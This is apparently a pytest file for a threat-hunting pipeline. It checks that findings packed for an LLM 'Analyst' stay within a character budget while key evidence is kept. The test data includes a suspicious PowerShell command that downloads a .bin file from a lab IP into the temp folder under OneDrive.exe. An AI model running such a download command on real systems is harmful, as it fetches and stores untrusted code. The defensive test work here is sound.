"""One size budget for a batch, measured as the Analyst reads it (B9, B14, B51)."""

import json
from pathlib import Path

import pytest

from contracts import AnalystPayloadBatch, DomainRecord, HypothesisFindings, pack_for_analyst
from contracts.reasoning import COMMANDS_FOOTER, NAMES_FOOTER, NARRATIVE_OMITTED, NO_ROWS_FOOTER

ONEDRIVE = r"C:\Users\user\AppData\…cal\Microsoft\OneDrive\OneDrive.exe"


def _sent(payloads) -> str:
    """What `analyst.py:566` puts in the prompt: the batch, indented and ASCII-escaped."""
    return json.dumps(AnalystPayloadBatch(batch_id="d6b48ef0-L2", payloads=payloads).model_dump(mode="json"), indent=2)


def _task(task_id, narrative="short.", summaries=(), observations=(), facts=()):
    return HypothesisFindings(
        task_id=task_id, run_id="r", hypothesis_id=task_id, hypothesis="h",
        findings=[DomainRecord(domain="endpoint", narrative=narrative, summaries=list(summaries),
                               observations=list(observations), facts=list(facts))],
    )


def _cmd(n, text):
    return f"~ {n} row contributions, parent {ONEDRIVE}=1; command: {text}"


def test_no_budget_sends_everything():
    big = _task("t2", "y" * 3000, [f"~ s#{i}" for i in range(5)])
    assert pack_for_analyst([big])[0].findings[0].summaries == big.findings[0].summaries


def test_a_task_with_many_summaries_still_leaves_the_small_need_whole():
    small = _task("t1", summaries=["~ small#1 " + "x" * 80])
    big = _task("t2", summaries=[f"~ processes#{i} " + "z" * 300 for i in range(1, 6)])
    budget = len(_sent(pack_for_analyst([small, big]))) - 700

    payloads = pack_for_analyst([small, big], budget)

    big_sent = payloads[1].findings[0].summaries
    assert big_sent[0].startswith("~ processes#1")  # cited-first order kept
    assert big_sent[-1].startswith("… ")  # the rest are counted, not dropped silently
    assert payloads[0].findings[0].summaries == small.findings[0].summaries
    assert len(_sent(payloads)) <= budget


def test_narratives_go_first_longest_first():
    # d6b48ef0: narratives crossed whole while the download in the code facts was cut.
    t1 = _task("t1", "a" * 500, observations=["obs [processes#1]"])
    t2 = _task("t2", "b" * 900, observations=["obs [processes#2]"])
    budget = len(_sent(pack_for_analyst([t1, t2]))) - 300

    payloads = pack_for_analyst([t1, t2], budget)

    assert payloads[1].findings[0].narrative == NARRATIVE_OMITTED  # the longer one went
    assert payloads[0].findings[0].narrative == "a" * 500  # and that was enough
    assert [p.findings[0].observations for p in payloads] == [["obs [processes#1]"], ["obs [processes#2]"]]
    assert len(_sent(payloads)) <= budget


def test_observations_go_after_narratives_from_the_heaviest_domain_with_an_exact_count():
    t1 = _task("t1", "n" * 500, observations=[f"obs {i} " + "o" * 50 for i in range(2)])
    t2 = _task("t2", "n" * 500, observations=[f"obs {i} " + "o" * 200 for i in range(20)])
    skeleton = len(_sent(pack_for_analyst([_task("t1", "n" * 500), _task("t2", "n" * 500)])))
    budget = skeleton + 2000

    payloads = pack_for_analyst([t1, t2], budget)

    assert [p.findings[0].narrative for p in payloads] == [NARRATIVE_OMITTED] * 2
    assert len(payloads[0].findings[0].observations) == 2  # the smaller domain is left alone
    kept = payloads[1].findings[0].observations
    assert kept[0].startswith("obs 0 ") and kept[-1].startswith("… ")
    assert kept[-1].startswith(f"… {20 - (len(kept) - 1)} observations omitted")
    assert len(_sent(payloads)) <= budget


def test_empty_searches_go_before_command_lines_and_commands_shorten_before_any_is_dropped():
    download = "powershell.exe -C \"$uri = 'http://192.168.40.211/update/win-agent-2.4.1.bin';Invoke-WebRequest -Uri $uri -OutFile $env:TEMP\\svcupdate.dat\" " + "p" * 300
    facts = [NAMES_FOOTER, f"~ \"onedrive.exe\" in these rows is 1 file: {ONEDRIVE}=49",
             NO_ROWS_FOOTER, *(f"~ empty {i} " + "e" * 300 for i in range(6)),
             COMMANDS_FOOTER, *(_cmd(8 + i, f"cmd {i} " + "c" * 380) for i in range(3)), _cmd(16, download)]
    task = _task("t1", "n" * 50, facts=facts)
    full = len(_sent(pack_for_analyst([task])))
    budget = full - 2400  # the empty searches and then the shortening, not a dropped command

    sent = pack_for_analyst([task], budget)[0].findings[0]

    assert not any(f.startswith("~ empty") for f in sent.facts)
    assert NO_ROWS_FOOTER in sent.facts  # the header stays, with its count
    assert "~ … 6 lines omitted for size (full in findings.json)" in sent.facts
    commands = [f for f in sent.facts if "; command: " in f]
    assert len(commands) == 4  # all kept, shortened
    assert all(len(c.split("; command: ", 1)[1]) <= 201 for c in commands)
    assert "win-agent-2.4.1.bin" in commands[-1] and "svcupdate.dat" in commands[-1] and ONEDRIVE in commands[-1]
    assert len(_sent([pack_for_analyst([task], budget)[0]])) <= budget


def test_the_fallback_drops_the_most_repeated_line_from_the_domain_holding_the_most_commands():
    few = _task("t1", "n" * 20, facts=[COMMANDS_FOOTER, *(_cmd(1, f"few {i} " + "f" * 150) for i in range(2))])
    many = _task("t2", "n" * 20, facts=[COMMANDS_FOOTER, _cmd(3, "many a " + "m" * 150), _cmd(40, "many b " + "m" * 150),
                                       _cmd(2, "many c " + "m" * 150), _cmd(5, "many d " + "m" * 150)])
    budget = len(_sent(pack_for_analyst([few, many]))) - 150  # one line's worth, net of its note

    payloads = pack_for_analyst([few, many], budget)

    assert len([f for f in payloads[0].findings[0].facts if "; command: " in f]) == 2
    kept = [f for f in payloads[1].findings[0].facts if "; command: " in f]
    assert [f.split("; command: ")[1][:6] for f in kept] == ["many a", "many c", "many d"]  # 40 went first
    assert any(f.startswith("~ … 1 command lines omitted") for f in payloads[1].findings[0].facts)
    assert len(_sent(payloads)) <= budget


def test_the_batch_never_ships_over_budget():
    # reasoning.py:893 warned and shipped: d6b48ef0's batch went out at 18,088 of 13,272.
    names = [NAMES_FOOTER, *(f"~ \"f{i}.exe\" in these rows is 1 file: {ONEDRIVE}\\f{i}.exe=1" for i in range(60))]
    tasks = [_task(f"t{i}", "n" * 400, summaries=["~ s#1 " + "s" * 200], facts=names) for i in range(3)]
    budget = 6000

    assert len(_sent(pack_for_analyst(tasks, budget))) <= budget


HANDOFF_CHAR_BUDGET = 13_272  # smartops.subagent_analysts.packing.HANDOFF_CHAR_BUDGET at d6b48ef0
FIXTURE = Path(__file__).parent / "fixtures" / "d6b48ef0_L2.json"
# The commands the Analyst never saw on d6b48ef0 L2 (sanitised: the user, host and lab range are renamed).
DOWNLOAD = ("win-agent-2.4.1.bin", "svcupdate", "Invoke-WebRequest", r"OneDrive\OneDrive.exe")


def _d6b48ef0(sparse: bool) -> list[HypothesisFindings]:
    tasks = [HypothesisFindings.model_validate(t) for t in json.loads(FIXTURE.read_text(encoding="utf-8"))]
    if sparse:  # what Yousef's sparse handoff (B51 item 3) would leave
        for t in tasks:
            t.findings = [f for f in t.findings if f.narrative or f.observations or f.summaries or f.facts]
    return tasks


def _download_crosses(payloads) -> bool:
    return any(all(s in line for s in DOWNLOAD) for p in payloads for f in p.findings for line in f.facts)


def test_d6b48ef0_keeps_the_download_within_budget_once_empty_domains_are_left_out():
    payloads = pack_for_analyst(_d6b48ef0(sparse=True), HANDOFF_CHAR_BUDGET)

    assert len(_sent(payloads)) <= HANDOFF_CHAR_BUDGET
    assert _download_crosses(payloads)


@pytest.mark.xfail(strict=True, reason="needs Yousef's sparse handoff (B51 item 3): 14 empty domains cost ~2.2k")
def test_d6b48ef0_keeps_the_download_within_budget_as_sent_today():
    payloads = pack_for_analyst(_d6b48ef0(sparse=False), HANDOFF_CHAR_BUDGET)

    assert len(_sent(payloads)) <= HANDOFF_CHAR_BUDGET
    assert _download_crosses(payloads)
